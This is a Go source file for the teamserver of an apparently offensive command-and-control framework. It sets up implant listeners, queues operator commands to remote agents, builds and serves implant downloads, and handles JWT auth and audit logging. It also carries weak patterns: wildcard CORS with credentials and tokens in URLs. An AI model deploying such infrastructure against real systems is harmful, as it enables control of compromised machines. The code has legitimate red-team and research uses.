package teamserver

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"database/sql"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"net"
	"net/http"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"

	"c2/internal/teamserver/agent"
	"c2/internal/teamserver/api"
	"c2/internal/teamserver/auth"
	teamsrvCrypto "c2/internal/teamserver/crypto"
	"c2/internal/teamserver/database"
	"c2/internal/teamserver/listener"
)

// Server is the main teamserver instance.
type Server struct {
	config      *Config
	db          *sql.DB
	gin         *gin.Engine
	httpServer  *http.Server
	masterKey   []byte
	jwtSecret   string

	authHandler     *auth.AuthHandler
	listenerMgr     *listener.Manager
	agentMgr        *agent.Manager
	taskMgr         *agent.TaskManager
	agentHandler    *agent.Handler
	listenerHandler *listener.Handler
	builder         *api.ImplantBuilder
	wsHandler       *api.WSHandler
}

// New creates a new Server instance.
func New(cfg *Config) (*Server, error) {
	// Open database
	db, err := database.Open(cfg.Database.Path)
	if err != nil {
		return nil, fmt.Errorf("opening database: %w", err)
	}

	// Apply migrations
	if err := database.ApplyMigrations(db); err != nil {
		db.Close()
		return nil, fmt.Errorf("applying migrations: %w", err)
	}

	// Load or generate master key
	masterKey, err := loadOrGenerateMasterKey(cfg)
	if err != nil {
		db.Close()
		return nil, fmt.Errorf("master key: %w", err)
	}

	// Load or generate JWT secret
	jwtSecret, err := loadOrGenerateJWTSecret(cfg)
	if err != nil {
		db.Close()
		return nil, fmt.Errorf("JWT secret: %w", err)
	}

	// Seed default admin if no operators exist
	if err := seedDefaultAdmin(db); err != nil {
		db.Close()
		return nil, fmt.Errorf("seeding admin: %w", err)
	}

	// Set up Gin
	gin.SetMode(gin.ReleaseMode)
	engine := gin.New()
	engine.Use(gin.Logger(), gin.Recovery())

	// Set up rate limiter: 5 login attempts per IP per minute
	loginLimiter := auth.NewRateLimiter(5, 1*time.Minute)
	loginLimiter.Cleanup(5 * time.Minute)

	// Set up auth handler
	ah := &auth.AuthHandler{
		DB:          db,
		Secret:      jwtSecret,
		RateLimiter: loginLimiter,
	}
	ah.JWT.AccessExpiry = cfg.JWT.AccessExpiry
	ah.JWT.RefreshExpiry = cfg.JWT.RefreshExpiry

	// Set up agent manager and task manager
	am := agent.NewManager(db)
	tm := agent.NewTaskManager(db)

	// Set up agent handler (handles incoming implant connections)
	aHandler := agent.NewHandler(am, tm, masterKey)

	// Set up listener manager (the callback wires listener → agent handler)
	lm := listener.NewManager(db, func(listenerID string, conn net.Conn) {
		aHandler.HandleConnection(listenerID, conn)
	})

	// Set up listener HTTP handler (needs context from Run)
	lh := listener.NewHandler(lm, nil) // ctx set later

	s := &Server{
		config:          cfg,
		db:              db,
		gin:             engine,
		masterKey:       masterKey,
		jwtSecret:       jwtSecret,
		authHandler:     ah,
		listenerMgr:     lm,
		agentMgr:        am,
		taskMgr:         tm,
		agentHandler:    aHandler,
		listenerHandler: lh,
		builder: api.NewImplantBuilder(db, teamsrvCrypto.EncodeKey(masterKey), "./payloads"),
	}

	// Set up WebSocket handler
	s.wsHandler = api.NewWSHandler(am, jwtSecret)

	// Set up routes
	s.setupRoutes()

	// Configure TLS
	tlsConfig, err := s.getTLSConfig()
	if err != nil {
		db.Close()
		return nil, fmt.Errorf("TLS config: %w", err)
	}

	s.httpServer = &http.Server{
		Addr:      cfg.Addr(),
		Handler:   engine,
		TLSConfig: tlsConfig,
	}

	return s, nil
}

// Run starts the teamserver and blocks until the context is cancelled.
func (s *Server) Run(ctx context.Context) error {
	// Set context for listener handler
	s.listenerHandler.SetContext(ctx)

	// Start dead agent detection
	go s.agentMgr.DeadCheckLoop(ctx)

	// Recover listeners that were running before shutdown
	s.listenerMgr.Recover(ctx)

	log.Printf("[INFO] Teamserver starting on %s", s.config.Addr())

	errCh := make(chan error, 1)

	go func() {
		if s.httpServer.TLSConfig.Certificates != nil {
			log.Printf("[INFO] Using configured TLS certificates")
			errCh <- s.httpServer.ListenAndServeTLS("", "")
		} else {
			log.Printf("[INFO] Using self-signed TLS certificate (development mode)")
			errCh <- s.httpServer.ListenAndServeTLS(s.config.TLS.CertFile, s.config.TLS.KeyFile)
		}
	}()

	select {
	case <-ctx.Done():
		log.Printf("[INFO] Shutting down...")
		return s.Shutdown(context.Background())
	case err := <-errCh:
		if err != http.ErrServerClosed {
			return fmt.Errorf("server error: %w", err)
		}
		return nil
	}
}

// Shutdown gracefully stops the server.
func (s *Server) Shutdown(ctx context.Context) error {
	// Stop all listeners
	for _, l := range s.listenerMgr.List() {
		if l.Status == "running" {
			s.listenerMgr.Stop(l.ID)
		}
	}

	// Shutdown HTTP server
	shutdownCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	if err := s.httpServer.Shutdown(shutdownCtx); err != nil {
		log.Printf("[WARN] HTTP shutdown error: %v", err)
	}

	// Close database
	if err := database.Close(s.db); err != nil {
		log.Printf("[WARN] DB close error: %v", err)
	}

	log.Printf("[INFO] Teamserver stopped")
	return nil
}

// DB returns the database connection.
func (s *Server) DB() *sql.DB {
	return s.db
}

// Config returns the server configuration.
func (s *Server) Config() *Config {
	return s.config
}

// MasterKey returns the master encryption key.
func (s *Server) MasterKey() []byte {
	return s.masterKey
}

// JWTSecret returns the JWT signing secret.
func (s *Server) JWTSecret() string {
	return s.jwtSecret
}

func (s *Server) setupRoutes() {
	// CORS middleware
	s.gin.Use(func(c *gin.Context) {
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		c.Header("Access-Control-Allow-Headers", "Origin, Content-Type, Authorization")
		c.Header("Access-Control-Allow-Credentials", "true")
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(http.StatusNoContent)
			return
		}
		c.Next()
	})

	api := s.gin.Group("/api/v1")
	{
		// Public auth endpoints
		authGroup := api.Group("/auth")
		{
			authGroup.POST("/login", s.authHandler.Login)
			authGroup.POST("/refresh", s.authHandler.Refresh)
		}

		// Protected endpoints (any authenticated user)
		protected := api.Group("")
		protected.Use(auth.AuthRequired(s.jwtSecret))
		{
			// Auth (self-service)
			protected.POST("/auth/logout", s.authHandler.Logout)
			protected.GET("/auth/me", s.authHandler.Me)
			// Dashboard (read-only)
			protected.GET("/dashboard/stats", s.handleDashboardStats)
			// Listeners (read operations)
			protected.GET("/listeners", s.listenerHandler.ListListeners)
			protected.GET("/listeners/:id", s.listenerHandler.GetListener)
			// Agents (read-only)
			protected.GET("/agents", s.handleListAgents)
			protected.GET("/agents/:id", s.handleGetAgent)
			// Tasks (read + create)
			protected.GET("/agents/:id/tasks", s.handleListTasks)
			protected.POST("/agents/:id/tasks", s.handleCreateTask)
			protected.GET("/tasks/:id", s.handleGetTask)
			// Audit (read-only)
			protected.GET("/audit", s.handleListAuditLogs)
		}

		// Admin-only endpoints (sensitive operations)
		admin := api.Group("")
		admin.Use(auth.AuthRequired(s.jwtSecret), auth.AdminRequired())
		{
			// Listeners (mutating operations)
			admin.POST("/listeners", s.listenerHandler.CreateListener)
			admin.DELETE("/listeners/:id", s.listenerHandler.DeleteListener)
			admin.POST("/listeners/:id/start", s.listenerHandler.StartListener)
			admin.POST("/listeners/:id/stop", s.listenerHandler.StopListener)
			// Agents (delete)
			admin.DELETE("/agents/:id", s.handleDeleteAgent)
			// Tasks (delete)
			admin.DELETE("/tasks/:id", s.handleDeleteTask)
			// Build
			admin.POST("/build", s.handleBuildImplant)
		}
	}

	// Health check (public)
	s.gin.GET("/health", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})

	// WebSocket for real-time agent terminal
	s.gin.GET("/ws/agents/:id", s.wsHandler.HandleAgentWS)

	// Download built implants (token via query param for <a href> links)
	s.gin.GET("/api/v1/download/:filename", s.handleDownload)

}

// --- Dashboard ---

func (s *Server) handleDashboardStats(c *gin.Context) {
	var stats database.DashboardStats

	s.db.QueryRow("SELECT COUNT(*) FROM agents").Scan(&stats.AgentCount)
	s.db.QueryRow("SELECT COUNT(*) FROM agents WHERE status = 'active'").Scan(&stats.ActiveAgents)
	s.db.QueryRow("SELECT COUNT(*) FROM listeners").Scan(&stats.ListenerCount)
	s.db.QueryRow("SELECT COUNT(*) FROM listeners WHERE status = 'running'").Scan(&stats.RunningListeners)
	s.db.QueryRow("SELECT COUNT(*) FROM tasks").Scan(&stats.TaskCount)
	s.db.QueryRow("SELECT COUNT(*) FROM tasks WHERE date(created_at) = date('now')").Scan(&stats.TasksToday)

	c.JSON(http.StatusOK, stats)
}

// --- Agents ---

func (s *Server) handleListAgents(c *gin.Context) {
	status := c.Query("status")
	agents := s.agentMgr.List(status)
	if agents == nil {
		agents = []*database.Agent{}
	}
	c.JSON(http.StatusOK, agents)
}

func (s *Server) handleGetAgent(c *gin.Context) {
	id := c.Param("id")
	state, ok := s.agentMgr.Get(id)
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{
			"error": gin.H{"code": "NOT_FOUND", "message": "Agent not found"},
		})
		return
	}

	// Return agent info with live status
	agent := state.Agent
	agent.LastSeen = state.LastSeen.UTC().Format(time.RFC3339)
	c.JSON(http.StatusOK, agent)
}

func (s *Server) handleDeleteAgent(c *gin.Context) {
	id := c.Param("id")

	// 1. Check if agent is alive
	state, alive := s.agentMgr.Get(id)
	if alive && state.Agent.Status == "active" {
		log.Printf("[INFO] Sending exit command to active agent %s before deletion", id)

		// 2. Enqueue exit task
		claims := auth.GetClaims(c)
		var opID *string
		if claims != nil {
			opID = &claims.OperatorID
		}
		exitTask := &database.Task{
			AgentID:    id,
			OperatorID: opID,
			Command:    "exit",
			Arguments:  "",
			TimeoutSec: 5,
		}
		s.taskMgr.Enqueue(exitTask)
		s.taskMgr.NotifyAgent(id)

		// 3. Wait up to 3s for the task to be picked up
		time.Sleep(3 * time.Second)
	}

	// 4. Clean up
	s.agentMgr.Unregister(id)
	s.db.Exec("DELETE FROM agents WHERE id = ?", id)
	c.JSON(http.StatusOK, gin.H{"message": "Agent deleted"})
}

// --- Tasks ---

func (s *Server) handleListTasks(c *gin.Context) {
	agentID := c.Param("id")
	status := c.Query("status")
	tasks, err := s.taskMgr.ListByAgent(agentID, status)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": gin.H{"code": "INTERNAL", "message": err.Error()},
		})
		return
	}
	if tasks == nil {
		tasks = []*database.Task{}
	}
	c.JSON(http.StatusOK, tasks)
}

type createTaskRequest struct {
	Command   string `json:"command" binding:"required"`
	Arguments string `json:"arguments"`
	Timeout   int    `json:"timeout"`
}

func (s *Server) handleCreateTask(c *gin.Context) {
	agentID := c.Param("id")

	// Verify agent exists
	if _, ok := s.agentMgr.Get(agentID); !ok {
		c.JSON(http.StatusNotFound, gin.H{
			"error": gin.H{"code": "NOT_FOUND", "message": "Agent not found"},
		})
		return
	}

	var req createTaskRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": gin.H{"code": "BAD_REQUEST", "message": "command is required"},
		})
		return
	}

	if req.Timeout <= 0 {
		req.Timeout = 60
	}

	// Get operator ID from JWT claims
	claims := auth.GetClaims(c)
	var operatorID *string
	if claims != nil {
		operatorID = &claims.OperatorID
	}

	task := &database.Task{
		AgentID:    agentID,
		OperatorID: operatorID,
		Command:    req.Command,
		Arguments:  req.Arguments,
		TimeoutSec: req.Timeout,
	}

	if err := s.taskMgr.Enqueue(task); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": gin.H{"code": "INTERNAL", "message": err.Error()},
		})
		return
	}

	// Signal the agent that a task is available
	s.taskMgr.NotifyAgent(agentID)

	c.JSON(http.StatusCreated, task)
}

func (s *Server) handleGetTask(c *gin.Context) {
	id := c.Param("id")
	task, err := s.taskMgr.Get(id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{
			"error": gin.H{"code": "NOT_FOUND", "message": "Task not found"},
		})
		return
	}
	c.JSON(http.StatusOK, task)
}

func (s *Server) handleDeleteTask(c *gin.Context) {
	id := c.Param("id")
	if err := s.taskMgr.Delete(id); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": gin.H{"code": "INTERNAL", "message": err.Error()},
		})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Task deleted"})
}

// --- Audit Logs ---

func (s *Server) handleListAuditLogs(c *gin.Context) {
	page := 1
	limit := 50
	if p := c.Query("page"); p != "" {
		fmt.Sscanf(p, "%d", &page)
	}
	if l := c.Query("limit"); l != "" {
		fmt.Sscanf(l, "%d", &limit)
	}
	offset := (page - 1) * limit

	rows, err := s.db.Query(
		"SELECT id, operator_id, action, resource_type, resource_id, details_json, ip_address, created_at FROM audit_logs ORDER BY created_at DESC LIMIT ? OFFSET ?",
		limit, offset,
	)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": gin.H{"code": "INTERNAL", "message": err.Error()},
		})
		return
	}
	defer rows.Close()

	var logs []database.AuditLog
	for rows.Next() {
		var l database.AuditLog
		if err := rows.Scan(&l.ID, &l.OperatorID, &l.Action, &l.ResourceType, &l.ResourceID, &l.DetailsJSON, &l.IPAddress, &l.CreatedAt); err != nil {
			continue
		}
		logs = append(logs, l)
	}
	if logs == nil {
		logs = []database.AuditLog{}
	}

	c.JSON(http.StatusOK, gin.H{
		"data":  logs,
		"page":  page,
		"limit": limit,
	})
}

// --- Build (stub for now, full implementation in Phase 8) ---

func (s *Server) handleBuildImplant(c *gin.Context) {
	var req api.BuildRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": gin.H{"code": "BAD_REQUEST", "message": "os, arch, and listener_id are required"},
		})
		return
	}

	result, err := s.builder.Build(&req)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": gin.H{"code": "BUILD_FAILED", "message": err.Error()},
		})
		return
	}

	// Extract raw JWT for download URL (browser <a href> uses query param)
	rawToken := ""
	if authHeader := c.GetHeader("Authorization"); strings.HasPrefix(authHeader, "Bearer ") {
		rawToken = authHeader[7:]
	}
	downloadURL := fmt.Sprintf("/api/v1/download/%s?token=%s", result.Filename, rawToken)

	c.JSON(http.StatusOK, gin.H{
		"download_url":    downloadURL,
		"filename":        result.Filename,
		"checksum":        result.SHA256,
		"os":              result.OS,
		"arch":            result.Arch,
		"connection_type": req.ConnectionType,
		"listener_id":     req.ListenerID,
	})

	// Audit
	claims := auth.GetClaims(c)
	var opID *string
	if claims != nil {
		opID = &claims.OperatorID
	}
	s.logAudit(opID, "implant.build", "implant", result.Filename,
		fmt.Sprintf(`{"os":"%s","arch":"%s","listener":"%s","type":"%s"}`,
			req.OS, req.Arch, req.ListenerID, req.ConnectionType), c.ClientIP())
}

func (s *Server) handleDownload(c *gin.Context) {
	// Authenticate via query parameter token (browser <a href> can't set headers)
	token := c.Query("token")
	if token == "" {
		c.JSON(http.StatusUnauthorized, gin.H{"error": gin.H{"code": "UNAUTHORIZED", "message": "Missing token"}})
		return
	}
	if _, err := auth.ValidateAccessToken(token, s.jwtSecret); err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"error": gin.H{"code": "UNAUTHORIZED", "message": "Invalid or expired token"}})
		return
	}

	filename := c.Param("filename")
	if strings.Contains(filename, "..") || strings.Contains(filename, "/") || strings.Contains(filename, "\\") {
		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"code": "BAD_REQUEST", "message": "Invalid filename"}})
		return
	}
	filePath := filepath.Join(s.builder.OutputDir, filename)
	c.File(filePath)
}

// --- TLS and crypto helpers ---

func (s *Server) getTLSConfig() (*tls.Config, error) {
	if s.config.TLS.CertFile != "" && s.config.TLS.KeyFile != "" {
		cert, err := tls.LoadX509KeyPair(s.config.TLS.CertFile, s.config.TLS.KeyFile)
		if err != nil {
			return nil, fmt.Errorf("loading TLS cert: %w", err)
		}
		return &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}, nil
	}

	cert, err := generateSelfSignedCert()
	if err != nil {
		return nil, fmt.Errorf("generating self-signed cert: %w", err)
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}, nil
}

func (s *Server) logAudit(operatorID *string, action, resourceType, resourceID string, details string, ip string) {
	id := uuid.New().String()
	now := time.Now().UTC().Format(time.RFC3339)
	s.db.Exec(
		"INSERT INTO audit_logs (id, operator_id, action, resource_type, resource_id, details_json, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
		id, operatorID, action, resourceType, resourceID, details, ip, now,
	)
}

func generateSelfSignedCert() (tls.Certificate, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"C2 Development"},
			CommonName:   "localhost",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{"localhost"},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return tls.Certificate{}, err
	}

	return cert, nil
}

func loadOrGenerateMasterKey(cfg *Config) ([]byte, error) {
	if cfg.MasterKey != "" {
		return teamsrvCrypto.DecodeKey(cfg.MasterKey)
	}

	key, err := teamsrvCrypto.GenerateMasterKey()
	if err != nil {
		return nil, err
	}

	cfg.MasterKey = teamsrvCrypto.EncodeKey(key)
	log.Printf("[INFO] Generated new master key")

	return key, nil
}

func loadOrGenerateJWTSecret(cfg *Config) (string, error) {
	if cfg.JWT.Secret != "" {
		return cfg.JWT.Secret, nil
	}

	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	secret := hex.EncodeToString(b)
	cfg.JWT.Secret = secret
	log.Printf("[INFO] Generated new JWT secret")

	return secret, nil
}

func seedDefaultAdmin(db *sql.DB) error {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM operators").Scan(&count)
	if err != nil {
		return err
	}

	if count > 0 {
		return nil
	}

	b := make([]byte, 12)
	if _, err := rand.Read(b); err != nil {
		return err
	}
	password := hex.EncodeToString(b)[:12]

	hash, err := auth.HashPassword(password)
	if err != nil {
		return err
	}

	id := uuid.New().String()
	_, err = db.Exec(
		"INSERT INTO operators (id, username, password_hash, role) VALUES (?, ?, ?, ?)",
		id, "admin", hash, "admin",
	)
	if err != nil {
		return err
	}

	log.Printf("============================================")
	log.Printf("  Default admin created:")
	log.Printf("  Username: admin")
	log.Printf("  Password: %s", password)
	log.Printf("  CHANGE THIS PASSWORD ON FIRST LOGIN")
	log.Printf("============================================")

	return nil
}
